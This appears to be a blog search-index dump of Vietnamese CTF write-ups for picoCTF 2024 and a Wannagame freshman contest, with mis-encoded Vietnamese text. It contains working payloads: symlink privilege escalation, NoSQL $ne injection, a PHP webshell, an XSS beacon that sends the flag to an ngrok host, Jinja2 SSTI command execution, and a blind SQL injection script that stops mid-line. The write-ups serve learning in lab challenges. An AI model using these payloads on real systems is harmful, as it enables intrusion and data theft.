mÃ¬nh má»›i Ä‘á»ƒ Ã½ cÃ³ file script.py nÃªn mÃ¬nh má»Ÿ lÃªn xem, Ä‘Ã¢y lÃ  ná»™i dung file script.pyimport osimport ptyincorrect_ans_reply = \"Lol, good try, try again and good luck\\n\"if __name__ == \"__main__\":    try:      with open(\"/home/player/banner\", \"r\") as f:        print(f.read())    except:      print(\"*********************************************\")      print(\"***************DEFAULT BANNER****************\")      print(\"*Please supply banner in /home/player/banner*\")      print(\"*********************************************\")try:    request = input(\"what is the password? \\n\").upper()    while request:        if request == 'MY_PASSW@RD_@1234':            text = input(\"What is the top cyber security conference in the world?\\n\").upper()            if text == 'DEFCON' or text == 'DEF CON':                output = input(                    \"the first hacker ever was known for phreaking(making free phone calls), who was it?\\n\").upper()                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':                    scmd = 'su - player'                    pty.spawn(scmd.split(' '))                else:                    print(incorrect_ans_reply)            else:                print(incorrect_ans_reply)        else:            print(incorrect_ans_reply)            breakexcept:    KeyboardInterruptTrong file nÃ y thÃ¬ khÃ´ng cÃ³ gÃ¬ Ä‘Ã¡ng chÃº Ã½ trá»« 2 Ä‘iá»ƒm  File nÃ y cháº¡y dÆ°á»›i quyá»n root  File nÃ y Ä‘á»c ná»™i dung 1 tá»‡p tin lÃ  /home/player/bannerLÃºc nÃ y thÃ¬ ta rÃºt ra dÃ¹ng symlink Ä‘á»ƒ /home/player/banner trá» Ä‘á»ƒn /root/flag.txt vÃ  Ä‘á»c Ä‘Æ°á»£c flagBÃ¢y giá» chá»‰ cáº§n nc láº¡i server thÃ¬ script.py sáº½ tá»± Ä‘á»™ng Ä‘á»c flag in ra cho taCÃCH 2: crack passworkTrong bÃ i nÃ y chÃºng ta ngoÃ i quyá»n Ä‘á»c 1 sá»‘ file máº·c Ä‘á»‹nh thÃ¬ chÃºng ta láº¡i Ä‘Æ°á»£c cáº¥p quyá»n Ä‘á»c file /etc/shadow, file nÃ y lÃ  file quan trá»ng chá»©a password cá»§a táº¥t cáº£ user ( Ä‘Ã£ bá»‹ mÃ£ hoÃ¡ ) váº­y náº¿u chÃºng ta cÃ³ thá»ƒ decrypt láº¡i thÃ¬ chÃºng ta sáº½ cÃ³ password vÃ  thÄƒng lÃªn quyá»n rootVá» cÃ¡ch crack password thÃ¬ mÃ¬nh sá»­ dá»¥ng tool hashcat Ä‘á»ƒ crack ra passwordCÃ¡ch nÃ y thÃ¬ mÃ¬nh khÃ´ng Ä‘Ã¡nh giÃ¡ cao láº¯m vÃ¬ nhÃ¬n hÆ¡i cÃ¹i &lt;(â€œ) nhÆ°ng mÃ  nÃ³ cÅ©ng lÃ  má»™t cÃ¡chFunfact: Trong lÃºc lÃ m bÃ i nÃ y mÃ¬nh Ä‘Ã£ ngáº«u nhiÃªn gÃµ Ä‘Ãºng password cá»§a root trong ngay láº§n Ä‘áº§u tiÃªn, sau Ä‘Ã³ mÃ¬nh má»›i dÃ¹ng cÃ¡ch symlinkFlag: picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_68ca8b23}GENERAL SKILLS: SansAlphaThe Multiverse is within your grasp! Unfortunately, the server that contains the secrets of the multiverse is in a universe where keyboards only have numbers and (most) symbols.Additional details will be available after launching your challenge instance.BÃ i nÃ y cháº·n táº¥t cáº£ cÃ¡c chá»¯ cÃ¡i vÃ  1 sá»‘ kÃ½ tá»± Ä‘áº·c biá»‡t, chá»‰ cÃ³ thá»ƒ xÃ i sá»‘ vÃ  cÃ¡c kÃ½ tá»± Ä‘áº·c biá»‡t. BÃ i nÃ y sau má»™t lÃºc suy nghÄ© thÃ¬ mÃ¬nh nghÄ© theo hÆ°á»›ng wildcards vÃ  tÃ¬m ra 2 cÃ¡ch khÃ¡ hayCÃ¡ch 1: Sá»­ dá»¥ng base32Sau má»™t lÃºc fuzzing thÃ¬ mÃ¬nh tÃ¬m tháº¥y file flag.txt á»Ÿ ./blargh/flag.txtTiáº¿p theo chÃºng ta cáº§n tÃ¬m cÃ¡ch Ä‘á»c flag. Äá»ƒ thá»±c thi Ä‘Æ°á»£c lá»‡nh thÃ¬ trong lá»‡nh Ä‘Ã³ chá»‰ cÃ³ thá»ƒ cÃ³ kÃ½ tá»± Ä‘áº·c biá»‡t vÃ  sá»‘, káº¿t há»£p wildcard chÃºng ta chá»‰ cáº§n tÃ¬m nhá»¯ng lá»‡nh cÃ³ sá»‘ lÃ  Ä‘Æ°á»£c. Sau Ä‘Ã³, mÃ¬nh tÃ¬m Ä‘Æ°á»£c 2 lá»‡nh cÃ³ thá»ƒ dÃ¹ng Ä‘Æ°á»£c Ä‘Ã³ lÃ  base64 vÃ  base32NhÆ°ng cÃ³ má»™t váº¥n Ä‘á» Ä‘Ã³ lÃ  base64 khi dÃ¹ng wildcard láº¡i trÃ¹ng vá»›i má»™t tá»‡p thá»±c thi khÃ¡c /usr/bin/x86_64 váº­y thÃ¬ cÃ²n láº¡i base32 cÃ³ váº» kháº£ thiChÃºng ta cÃ³ thá»ƒ dÃ¹ng wildcard gá»i ra file base32 nhÆ° sau /???/???/????32 vÃ  flag thÃ¬ cÃ³ Ä‘á»‹a chá»‰ á»Ÿ trÃªn rá»“i bÃ¢y giá» káº¿t há»£p láº¡i Ä‘á»ƒ Ä‘á»c flag.txt.Decode base32 sex ra flagCÃ¡ch 2: Sá»­ dá»¥ng stringsLÃºc nÃ£y mÃ¬nh má»›i nÃ³i lÃ  chá»‰ cÃ³ thá»ƒ gá»i ra file thá»±c thi cÃ³ sá»‘ thÃ´i mÃ  lá»‡nh strings thÃ¬ lÃ m gÃ¬ cÃ³ sá»‘ Ä‘á»ƒ mÃ  gá»i =))) tháº­t ra lÃ  cÃ³ má»™t cÃ¡ch nhÆ°ng cÃ¡ch nÃ y chá»‰ gá»i Ä‘Æ°á»£c ráº¥t giá»›i háº¡nBáº±ng cÃ¡ch táº­n dá»¥ng tham sá»‘ special bash ta cÃ³ thá»ƒ gá»i ra má»™t sá»‘ kÃ½ tá»±, nhÆ° á»Ÿ challenge hiá»‡n táº¡i chÃºng ta cÃ³ dÃ¹ng $- Ä‘á»ƒ gá»i ra cÃ¡c kÃ½ tá»± sau 'h', 'i', 'm', 'B', 'H', 's'Giáº£i thÃ­ch ngáº¯n gá»n thÃ¬ $- lÃ  tá»•ng há»£p cÃ¡c flag Ä‘Æ°á»£c thiáº¿t láº­p cho shell bash hiá»‡n táº¡i, nhÆ° shell á»Ÿ trÃªn thÃ¬ Ã½ nghÄ©a tá»«ng kÃ½ tá»± nhÆ° sauH - histexpand: ÄÃ¢y lÃ  flag cho phÃ©p chÃºng ta láº¥y nhá»¯ng gÃ¬ chÃºng ta Ä‘Ã£ nháº­p bá» vÃ o input Ä‘á»ƒ tiáº¿p tá»¥c thá»±c hiá»‡n lá»‡nh, cho phÃ©p chÃºng ta dá»… dÃ ng nháº­p vÃ  láº·p láº¡i lá»‡nhm - monitor: ÄÃ¢y lÃ  flag liÃªn quan Ä‘áº¿n job control, giÃºp chÃºng ta theo dÃµi cÃ¡c job trong shellh - hashall: ÄÃ¢y lÃ  flag Ä‘Æ°á»£c báº­t lÃªn máº·c Ä‘á»‹nh, nÃ³ giÃºp lÆ°u trá»¯ cÃ¡c lá»‡nh mÃ  ta thÆ°á»ng xÃ i Ä‘á»ƒ giÃºp tÄƒng tá»‘c tá»‘c Ä‘á»™ thá»±c thi chÆ°Æ¡ng trÃ¬nhB - braceexpand: ÄÃ¢y lÃ  flag lÃ m cho shell cÃ³ thá»ƒ sá»­ dá»¥ng brace expansioni - interactive: ÄÃ¢y lÃ  flag khi mÃ  shell cÃ³ thá»ƒ tÆ°Æ¡ng tÃ¡c Ä‘Æ°á»£cCÃ³ thá»ƒ Ä‘á»c thÃªm táº¡i Ä‘Ã¢y LINKBÃ¢y giá» dá»±a vÃ o Ä‘Ã³, chÃºng ta cÃ³ thá»ƒ gÃ¡n giÃ¡ trá»‹ Ä‘Ã³ vÃ o má»™t biáº¿n khÃ¡c Ä‘á»ƒ dá»… dÃ ng sá»­ dá»¥ng hÆ¡n mÃ¬nh sá»­ dá»¥ng biáº¿n ____ Ä‘á»ƒ láº¥y giÃ¡ trá»‹ $-LÃºc nÃ y mÃ¬nh kiá»ƒm tra Ä‘Ã£ gÃ¡n thÃ nh cÃ´ng bÃ¢y giá» Ä‘áº¿n bÆ°á»›c láº¥y kÃ½ tá»± trong Ä‘Ã³ ra báº±ng ${____:index:len}Sau khi Ä‘Ã¡nh giÃ¡ cÃ¡c lá»‡nh cÃ³ thá»ƒ mÃ¬nh Ä‘Ã£ chá»n lá»‡nh strings Ä‘á»ƒ sá»­ dá»¥ng, dá»±a vÃ o cÃ¡c dá»¯ kiá»‡n á»Ÿ trÃªn mÃ¬nh cÃ³ thá»ƒ craft Ä‘Æ°á»£c payload nhÆ° sau /?${____:5:1}?/???/${____:5:1}??${____:1:1}??${____:5:1} (/?s?/???/s??i??s)LÃºc nÃ y chÃºng ta gáº§n nhÆ° cÃ³ Ä‘Æ°á»£c lá»‡nh ls (fake) vÃ  cat (fake) vá»›i lá»‡nh nÃ y ta cÃ³ thá»ƒ Ä‘á»c báº¥t ká»³ file nÃ o náº¿u biáº¿t Ä‘á»‹a chá»‰Äá»c flagFlag: picoCTF{7h15_mu171v3r53_15_m4dn355_36a674c0}WEB EXPLOITATION: No Sql InjectionCan you try to get access to this website to get the flag?You can download the source here.The website is running here. Can you log in?App sá»­ dá»¥ng MongoDB, sá»­ dá»¥ng phÆ°Æ¡ng thá»©c POST Ä‘á»ƒ gá»­i giÃ¡ trá»‹ email vÃ  password lÃªnBÃ i nÃ y chá»‰ cÃ³ 2 chá»• cáº§n chÃº Ã½  Táº¡i /api/login/route.ts cÃ³ 1 Ä‘oáº¡n lá»‡nh nhÆ° sau       const users = await User.find({  email: email.startsWith(\"{\") &amp;&amp; email.endsWith(\"}\") ? JSON.parse(email) : email,  password: password.startsWith(\"{\") &amp;&amp; password.endsWith(\"}\") ? JSON.parse(password) : password});if (users.length &lt; 1)  return new Response(\"Invalid email or password\", { status: 401 },users);else {  return new Response(JSON.stringify(users), { status: 200 });}        VÃ  táº¡i /models/user.ts cÃ³ Ä‘oáº¡n lá»‡nh      const UserSchema: Schema = new Schema({email: { type: String, required: true, unique: true },firstName: { type: String, required: true },lastName: { type: String, required: true },password: { type: String, required: true },token: { type: String, required: false ,default: \"\"},  });  const User = models.User || mongoose.model&lt;UserInterface&gt;(\"User\", UserSchema);      Táº¡i route.ts Ä‘oáº¡n code sáº½ kiá»ƒm tra xem náº¿u biáº¿n email vÃ  password truyá»n vÃ o báº¯t Ä‘áº§u báº±ng â€˜{â€˜ vÃ  káº¿t thÃºc báº±ng â€˜}â€™ thÃ¬ parse cÃ¡i JSON Ä‘Ã³ ra cÃ²n ngÆ°á»£c láº¡i thÃ¬ truyá»n vÃ o nguyÃªn giÃ¡ trá»‹ Ä‘Ã³ vÃ  náº¿u login vÃ o thÃ nh cÃ´ng sáº½ tráº£ vá» usersTáº¡i user.ts Ä‘oáº¡n code trÃªn gÃ¡n má»™t key lÃ  token vá»›i value máº·c Ä‘á»‹nh lÃ  FLAGMongoDB thÃ¬ cÃ³ thá»ƒ thÃªm má»™t sá»‘ query operator Ä‘á»ƒ táº¡o ra cÃ¡c Ä‘iá»u kiá»‡n cá»¥ thá»ƒ Ä‘á»ƒ database tráº£ vá» dá»¯ liá»‡u á»©ng vá»›i Ä‘iá»u kiá»‡n Ä‘Ã³, dá»±a vÃ o Ä‘Ã³ ta cÃ³ thá»ƒ báº¯t nÃ³ tráº£ vá» giÃ¡ trá»‹ mÃ  ta mong muá»‘nVáº­y chÃºng ta cÃ³ thá»ƒ thÃªm má»™t query operator $ne Ä‘á»ƒ tráº£ vá» táº¥t cáº£ giÃ¡ trá»‹ khÃ´ng giá»‘ng vá»›i giÃ¡ trá»‹ ta nháº­p vÃ oDecode token vÃ  cÃ³ Ä‘Æ°á»£c flagFlag: picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_af67328d}WEB EXPLOITATION: TricksterI found a web app that can help process images: PNG images only!Additional details will be available after launching your challenge instance.BÃ i nÃ y cho má»™t trang web Ä‘á»ƒ upload áº£nh png lÃªn, vÃ¬ Ä‘Ã¢y lÃ  má»™t bÃ i blackbox nÃªn mÃ¬nh check /robots.txt xem cÃ³ gÃ¬ hot khÃ´ngCÃ³ 2 Ä‘Æ°á»ng dáº«n  /uploads/ cÃ³ váº» Ä‘Ã¢y lÃ  nÆ¡i sáº½ lÆ°u trá»¯ cÃ¡c file mÃ¬nh upload lÃªn  /instructions.txt ná»™i dung cá»§a nÃ³ tÃ³m táº¯t lÃ  nÃ³ sáº½ cho phÃ©p file upload lÃªn cÃ³ .png trong tÃªn, cÃ³ header cá»§a PNGUpload má»™t vÃ i bá»©c áº£nh thÃ¬ nháº­n ra backend cá»§a web sá»­ dá»¥ng PHP nÃªn mÃ¬nh sáº½ up file PHP Ä‘á»ƒ táº¡o má»™t cÃ¡i webshellCÃ³ Ä‘Æ°á»£c webshell rá»“i thÃ¬ láº¥y flag thÃ´iFlag: picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_3f706222}WEB EXPLOITATION: elementsInsert Standard Web Challenge Here.BÃ i nÃ y cho má»™t trang web cÃ³ giao diá»‡n nhÆ° sauTrang web nÃ y cÃ³ chá»©c nÄƒng kÃ©o cÃ¡c element vÃ o nhau Ä‘á»ƒ táº¡o ra element má»›i.Sau khi phÃ¢n tÃ­ch qua source code thÃ¬ cÃ³ cÃ¡c Ä‘iá»u Ä‘Ã¡ng chÃº Ã½ sau:  const evaluate = (...items) =&gt; {    const [a, b] = items.sort();    for (const [ingredientA, ingredientB, result] of recipes) {      if (ingredientA === a &amp;&amp; ingredientB == b) {        if (result === 'XSS' &amp;&amp; state.xss) {          eval(state.xss);        }        return result;      }    }\t  return null;  }Äoáº¡n code nÃ y náº¿u chÃºng ta táº¡o ra má»™t element cÃ³ tÃªn lÃ  XSS vÃ  cÃ³ giÃ¡ trá»‹ state.xss  thÃ¬ cÃ³ thá»ƒ thá»±c hiá»‡n lá»‡nh eval()try {\tstate = JSON.parse(atob(window.location.hash.slice(1)));\tfor (const [a, b] of state.recipe) {\t\tif (!found.has(a) || !found.has(b)) {\t\t\tbreak;\t\t}\t\tconst result = evaluate(a, b);\t\tfound.set(result, elements.get(result));\t}} catch(e) {}Äoáº¡n code nÃ y sáº½ láº¥y object state báº±ng cÃ¡ch decode pháº§n sau dáº¥u thÄƒng (fragment identifier) vÃ  parse nÃ³ sau Ä‘Ã³ láº¥y tá»«ng giÃ¡ trá»‹ trong state.recipe Ä‘á»ƒ craft lÃªn element má»›iconst csp =  [\t\t\"default-src 'none'\",\t\t\"style-src 'unsafe-inline'\",\t\t\"script-src 'unsafe-eval' 'self'\",\t\t\"frame-ancestors 'none'\",\t\t\"worker-src 'none'\",\t\t\"navigate-to 'none'\"]res.setHeader('Content-Security-Policy', csp.join('; '));res.setHeader('Cross-Origin-Opener-Policy', 'same-origin');res.setHeader('X-Frame-Options', 'deny');res.setHeader('X-Content-Type-Options', 'nosniff');Äoáº¡n nÃ y thÃ¬ set láº§n lÆ°á»£t cÃ¡c csp (Content-Security-Policy) Ä‘á»ƒ báº£o máº­t trang web giáº£i thÃ­ch sÆ¡ quaDefault-src: none : CÃ¡c nguá»“n Ä‘Æ°á»£c máº·t Ä‘á»‹nh lÃ  khÃ´ng cho phÃ©p tá»« báº¥t ká»³ nguá»“n nÃ oStyle-src : unsafe-inline : Cho phÃ©p chÃ¨n má»™t inline block styleScript-src : unsafe-eval self : Cho phÃ©p dÃ¹ng lá»‡nh eval vÃ  dÃ¹ng cÃ¡c script Ä‘Æ°á»£c táº£i tá»« cÃ¹ng má»™t nguá»“nframe-ancestors none : KhÃ´ng cho phÃ©p cÃ¡c trang web khÃ¡c nhÃºng nÃ³ vÃ o má»™t frame hay iframe nÃ o Ä‘Ã³worker-src 'none' : KhÃ´ng cho phÃ©p sá»­ dá»¥ng Worker Ä‘á»ƒ thá»±c thi cÃ¡c lá»‡nh javascript Ä‘á»™c láº­p cháº¡y song songnavigate-to 'none' : KhÃ´ng cho phÃ©p Ä‘iá»u hÆ°á»›ng trang webstate = {...state, flag }await mkdir(join(userDataDir, 'Default'));await writeFile(join(userDataDir, 'Default', 'Preferences'), JSON.stringify({\t\tnet: {\t\t\tnetwork_prediction_options: 2\t\t}}));const proc = spawn(\t\t'/usr/bin/chromium-browser-unstable', [\t\t`--user-data-dir=${userDataDir}`,\t\t'--profile-directory=Default',\t\t'--no-sandbox',\t\t'--js-flags=--noexpose_wasm,--jitless',\t\t'--disable-gpu',\t\t'--no-first-run',\t\t'--enable-experimental-web-platform-features',\t\t`http://127.0.0.1:8080/#${Buffer.from(JSON.stringify(state)).toString('base64')}`\t],\t{ detached: true })VÃ  cuá»‘i cÃ¹ng lÃ  Ä‘oáº¡n nÃ y, khi chÃºng ta Ä‘áº¿n Ä‘Æ°á»ng dáº«n /remoteCraft vÃ  cho nÃ³ 1 parameter recipe thÃ¬ chÃºng ta cÃ³ trigger server Ä‘i Ä‘áº¿n website nÃ y vá»›i pháº§n fragment identifier lÃ  giÃ¡ trá»‹ cá»§a object stateCÃ³ má»™t vÃ i setting Ä‘Ã£ Ä‘Æ°á»£c thÃªm vÃ o, Ä‘oáº¡n setting nÃ y sáº½ ngÄƒn khÃ´ng cho táº£i trÆ°á»›c báº¥t ká»³ tÃ i nguyÃªn tá»« máº¡ng nÃ onet:{  network_prediction_options: 2}Sau khi cÃ³ cÃ¡c dá»¯ kiá»‡n, chÃºng ta cÃ³ thá»ƒ nghá»‰ Ä‘áº¿n craft recipe sao cho tráº£ vá» káº¿t quáº£ lÃ  XSS vÃ  chÃ¨n lá»‡nh javascript vÃ o Ä‘á»ƒ eval gá»­i flag vá» cho chÃºng ta, mÃ¬nh Ä‘Ã£ thá»­ ráº¥t nhiá»u cÃ¡ch vÃ  tÃ¬m Ä‘Æ°á»£c má»™t cÃ¡ch Ä‘Ã³ lÃ  sourceMappingURL nhÆ°ng Ä‘á»ƒ dÃ¹ng Ä‘Æ°á»£c cÃ¡i nÃ y thÃ¬ pháº£i má»Ÿ Ä‘Æ°á»£c Devtools cá»§a chrome nhÆ°ng cÃ¡ch nÃ y hoÃ n toÃ n khÃ´ng Ä‘Æ°á»£c vÃ¬ dÃ­nh báº£o máº­t cá»§a chromeSau Ä‘Ã³ mÃ¬nh thá»­ ráº¥t nhiá»u lá»‡nh vÃ o nhÆ°ng khÃ´ng cÃ³ lá»‡nh nÃ o cÃ³ thá»ƒ vÆ°á»£t qua Ä‘Æ°á»£c csp vÃ  cÃ¡c setting cá»§a chrome trÃªn, Ä‘áº¿n lÃºc nÃ y thÃ¬ mÃ¬nh Ä‘Ã£ bÃ³ tay vÃ  bá» cuá»™cSau giáº£i khi mÃ¬nh Ä‘á»c Ä‘Æ°á»£c writeup cá»§a satoki thÃ¬ mÃ¬nh má»›i biáº¿t Ä‘Æ°á»£c ráº±ng chÃºng ta cÃ³ thá»ƒ dÃ¹ng PendingGetBeacon Ä‘Ã¢y lÃ  má»™t chá»©c nÄƒng thá»­ nghiá»‡m cá»§a chrome (sau nÃ y Ä‘Æ°á»£c thay tháº¿ báº±ng fetchLater á»Ÿ nhá»¯ng phiÃªn báº£n sau nÃ y)Giáº£i thÃ­ch vá» chá»©c nÄƒng cá»§a PendingGetBeacon nÃ³ sáº½ gá»­i request Ä‘áº¿n má»™t HTTPS server sau khi browser bá»‹ huá»· hoáº·c Ä‘Ã£ Ä‘Æ°á»£c lÆ°u vÃ o cache vÃ  khÃ´ng Ä‘Æ°á»£c táº£i láº¡i sau má»™t khoáº£ng thá»i gian. NhÆ°ng Ä‘iá»u Ä‘áº·c biá»‡t nháº¥t, nÃ³ khÃ´ng bá»‹ dÃ­nh giá»›i háº¡n cá»§a CSP vÃ  cÃ³ thá»ƒ dÃ¹ng Ä‘á»ƒ gá»­i data trong web ra ngoÃ iTa sáº½ thÃªm má»™t options Ä‘á»ƒ send beacon khi mÃ  trang  bá»‹ huá»·/ khÃ´ng Ä‘Æ°á»£c load sau 1 thá»i gian nháº¥t Ä‘á»‹nh sáº½ gá»­i request lÃªn server báº±ng {timeout:1000}(sau 1s sáº½ gá»­i)LÃºc nÃ y thÃ¬ Ä‘Ã£ biáº¿t Ä‘Æ°á»£c lá»‡nh nÃ o cÃ³ thá»ƒ sá»­ dá»¥ng Ä‘Æ°á»£c thÃ¬ Ä‘oáº¡n nÃ y Ä‘Ã£ dá»… rá»“iPayload: recipe={\"recipe\": [[\"Air\", \"Water\"], [\"Earth\", \"Water\"], [\"Earth\", \"Fire\"], [\"Fire\", \"Mist\"], [\"Magma\", \"Mud\"], [\"Fog\", \"Mud\"], [\"Obsidian\", \"Water\"], [\"Hot Spring\", \"Sludge\"], [\"Fire\", \"Steam Engine\"], [\"Air\", \"Earth\"], [\"Earth\", \"Obsidian\"], [\"Hot Spring\", \"Steam Engine\"], [\"Dust\", \"Heat Engine\"], [\"Computer Chip\", \"Fire\"], [\"Computer Chip\", \"Steam Engine\"], [\"Computer Chip\", \"Electricity\"], [\"Magma\", \"Mist\"], [\"Fire\", \"Sand\"], [\"Artificial Intelligence\", \"Data\"], [\"Computer Chip\", \"Software\"], [\"Air\", \"Rock\"], [\"Glass\", \"Software\"], [\"Encryption\", \"Software\"], [\"Internet\", \"Program\"], [\"Cybersecurity\", \"Vulnerability\"], [\"Exploit\", \"Web Design\"]], \"xss\": \"new PendingGetBeacon('https://NGROKSERVER/xxxx/?yuu=' + window.location.hash.slice(1), {timeout: 1000});\"}Sau khoáº£ng 1s sáº½ nháº­n Ä‘Æ°á»£c má»™t request Ä‘áº¿n server cá»§a taDecode vÃ  láº¥y flagFlag: picoCTF{little_alchemy_was_the_0g_game_does_anyone_rememb3r_9889fd4a}Fun fact: BÃ i nÃ y sau khi mÃ¬nh háº¿t cá»©u thÃ¬ mÃ¬nh Ä‘Ã£ thá»±c hiá»‡n phÆ°Æ¡ng thá»©c random bullshit go vÃ  bá»‹ ngÆ°á»i anh pro cá»§a mÃ¬nh nháº¯c nhá»Ÿ :\"(( may mÃ  khÃ´ng cÃ³ cÃ¡i payload nÃ o hack mÃ¡y mÃ¬nh, hehe cáº£m Æ¡n anh Ä‘Ã£ nháº¯c nhá»ŸLá»i báº¡t: Sau giáº£i thÃ¬ mÃ¬nh cÅ©ng há»c Ä‘Æ°á»£c thÃªm ráº¥t nhiá»u thá»© vÃ  Ä‘Æ°á»£c cÃ¹ng team chÆ¡i giáº£i nÃ y, mong sau nÃ y team mÃ¬nh Ä‘áº¡t Ä‘Æ°á»£c thá»© háº¡ng cao hÆ¡n. Cáº£m Æ¡n ae (Hidori, Kuro0, fuyosuru, SinsAries)Nguá»“n Writeup: https://github.com/satoki/ctf_writeups/tree/master/picoCTF_2024"
  },
  
  {
    "title": "Wannagame Freshman CTF writeup",
    "url": "/posts/Wannagame-Freshman/",
    "categories": "CTF Writeup",
    "tags": "SQL Injectiom, SSTI",
    "date": "2023-11-11 23:00:00 +0700",
    





    
    "snippet": "WannaWinFreshman-WriteupBÃ i 1 Warmup PHP:  TÃ³m táº¯t Ä‘á» thÃ¬ Ä‘áº¡i khÃ¡i lÃ  Ä‘á» báº£o chÃºng ta pháº£i POST data lÃªn dÆ°á»›i dáº¡ng json cÃ³ key lÃ  page vÃ  sau Ä‘Ã³ chÆ°Æ¡ng trÃ¬nh sáº½ server sáº½ decode ra vÃ  Ä‘á»c file tron...",
    "content": "WannaWinFreshman-WriteupBÃ i 1 Warmup PHP:  TÃ³m táº¯t Ä‘á» thÃ¬ Ä‘áº¡i khÃ¡i lÃ  Ä‘á» báº£o chÃºng ta pháº£i POST data lÃªn dÆ°á»›i dáº¡ng json cÃ³ key lÃ  page vÃ  sau Ä‘Ã³ chÆ°Æ¡ng trÃ¬nh sáº½ server sáº½ decode ra vÃ  Ä‘á»c file trong server      Sau khi phÃ¢n tÃ­ch vÃ  tÃ¬m kiáº¿m trÃªn máº¡ng thÃ¬ mÃ¬nh tÃ¬m Ä‘Æ°á»£c 1 bÃ i viáº¿tLINK        CÆ¡ báº£n lÃ  json_decode nÃ³ sáº½ decode luÃ´n mÃ£ unicode thÃ nh chá»¯ cÃ¡i vÃ¬ váº­y mÃ¬nh chá»‰nh láº¡i cÃ¡i payload cá»§a mÃ¬nh tá»« php://filter/convert.base64-encode/resource=/flagthÃ nh\\u0070hp://filter/convert.base64-encode/resource=/flag    Decode base64 vÃ  ra flag  Flag: W1{w3lc0m3_w3b_w4rrj0rs}    BÃ i 2 Namename:            BÃ i nÃ y cho 1 Ä‘Æ°á»ng link vÃ  khÃ´ng cho thÃªm gÃ¬ khÃ¡c sau khi xem source cá»§a web nÃ y thÃ¬ tháº¥y cÃ³ 1 Ä‘Æ°á»ng dáº«n lÃ  /wannaw1n    Sau khi Ä‘i tá»›i Ä‘Æ°á»ng dáº«n /wannaw1n mÃ¬nh nháº­n ra ngay Ä‘Ã¢y lÃ  SSTI jinja2  Payload : {{().__class__.__base__.__subclasses__()[279]('ls',shell=1,stdout=-1).communicate()}}      VÃ  nÃ³ bá»‹ cháº·n         Sau vÃ i thá»­ nghiá»‡m thÃ¬ cÃ³ váº½ nÃ³ cháº·n dáº¥u . vÃ  [] nÃªn mÃ¬nh chuyá»ƒn qua |attr     Payload má»›i: {{()|attr(\"__class__\")|attr(\"__base__\")|attr(\"__subclasses__\")()|attr(\"__getitem__\")(279)('ls',shell=1,stdout=-1)|attr('communicate')()}}  VÃ  nÃ³ Ä‘Ã£ hoáº¡t Ä‘á»™ng      BÃ¢y giá» sá»­a láº¡i payload tá»« ls sang cat flag.txt    VÃ  nÃ³ váº«n bá»‹ cháº·n cÃ¡i gÃ¬ Ä‘áº¥y nÃªn mÃ¬nh sá»­ dá»¥ng cÃ¡ch nÃ y bypass filter (chá»• nÃ y lÃ  cháº·n dáº¥u . vÃ  chá»¯ f thÃ¬ pháº£i)  {{()|attr(\"__class__\")|attr(\"__base__\")|attr(\"__subclasses__\")()|attr(\"__getitem__\")(279)('cat+*',shell=1,stdout=-1)|attr('communicate')()}}  CÃ¡ch nÃ y sáº½ Ä‘á»c háº¿t táº¥t cáº£ cÃ¡c file trong thÆ° má»¥c hiá»‡n táº¡i vÃ  tÃ¬m Ä‘Æ°á»£c flag  Flag: W1{U_are_master_in_SSTI}    BÃ i 3 Solite:        BÃ i nÃ y mÃ¬nh khÃ¡ tiáº¿c vÃ¬ mÃ¬nh Ä‘á»c khÃ´ng ká»‰ filter nÃªn mÃ¬nh khÃ´ng lÃ m Ä‘Æ°á»£c  TÃ³m táº¯t Ä‘á» thÃ¬ bÃ i nÃ y chá»‰ cho chÃºng ta cÃ¡i page nhÆ° tháº¿ nÃ y (blackbox)  Sau khi Ä‘á»c code vÃ  Ä‘Æ°á»£c nghe 1 sá»‘ gá»£i Ã½ thÃ¬ mÃ¬nh hiá»ƒu Ä‘Æ°á»£c Ä‘Ã¢y lÃ  Blind SQL Injection      NhÃ¬n kÄ© source thÃ¬ cÃ³ 1 lá»— há»•ng cho chÃºng ta khai thÃ¡c lÃ  substr khÃ´ng bá»‹ filter        ÄÃ¢y lÃ  query cá»§a bÃ i    Sau má»™t vÃ i thá»­ nghiá»‡m thÃ¬ mÃ¬nh tÃ¬m Ä‘Æ°á»£c cÃ¡ch Ä‘á»ƒ in ra tÃªn cá»§a báº£ng  Payload: 1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),i,1) is 'a'--  TÃ³m táº¯t :  Payload nÃ y sau khi gá»­i lÃªn server thÃ¬ server sáº½ thá»±c hiá»‡n 1 query nhÆ° sau SELECT * FROM API WHERE id LIKE '%1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1) is 'a'--%'  select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%' sáº½ tráº£ vá» tÃªn cá»§a táº¥t cáº£ cÃ¡c báº£ng  substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1) sáº½ láº¥y 1 kÃ½ tá»± a báº¯t Ä‘áº§u tá»« vá»‹ trÃ­ i  1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1) is 'a'-- cÃ¡i nÃ y sáº½ so sÃ¡nh kÃ½ tá»± mÃ  substr vá»«a cáº¯t ra náº¿u chÃ­nh xÃ¡c thÃ¬ sáº½ thá»±c hiá»‡n lá»‡nh Ä‘áº±ng trÆ°á»›c lÃ  SELECT * FROM API WHERE id LIKE '%1' vÃ  tráº£ vá» cá»™t id=1 náº¿u sai thÃ¬ nÃ³ khÃ´ng thá»±c hiá»‡n vÃ  cháº³ng tráº£ vá» gÃ¬ cáº£  ÄÃ¢y lÃ  script mÃ¬nh tÃ¬m tÃªn cá»§a báº£ngimport string,requestsfrom urllib.parse import quoteall_characters = string.ascii_letters + string.digits + \"!#$%&amp;()+,-/:&lt;=&gt;?@[]^_{}\"url = \"http://45.122.249.68:20020/search?name[]=\"payload=\"1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1) is 'a'--\"table_name = \"\"haha = 0for i in range(1,10000):    for ps in all_characters:        payload =\"1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%%'),%d,1) is '%c'--\" %(i,ps)        payload = 